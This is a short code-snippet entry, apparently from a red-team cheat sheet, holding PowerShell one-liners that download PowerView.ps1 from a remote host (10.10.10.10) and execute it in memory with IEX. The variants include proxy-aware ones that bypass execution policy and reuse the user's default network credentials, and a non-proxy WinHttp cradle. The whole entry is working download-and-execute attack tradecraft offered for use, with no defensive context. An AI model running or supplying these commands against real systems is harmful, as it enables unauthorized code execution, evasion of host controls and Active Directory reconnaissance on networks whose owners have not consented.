---
id: af50cfc4-381d-448b-b777-203d1a1deaee
type: code
language: ps1
verified: false
created_at: '2023-04-06T03:56:24.055907+00:00'
updated_at: '2023-04-10T20:37:01.111173+00:00'
---

# Code Snippet af50cfc4

**Language**: ps1

```ps1
# Download and execute PowerView

# Proxy-aware
IEX (New-Object Net.WebClient).DownloadString('http://10.10.10.10/PowerView.ps1')
echo IEX(New-Object Net.WebClient).DownloadString('http://10.10.10.10/PowerView.ps1') | powershell -noprofile -
powershell -exec bypass -c "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://10.10.10.10/PowerView.ps1')|iex"

# Non-proxy aware
$h=new-object -com WinHttp.WinHttpRequest.5.1;$h.open('GET','http://10.10.10.10/PowerView.ps1',$false);$h.send();iex $h.responseText
```
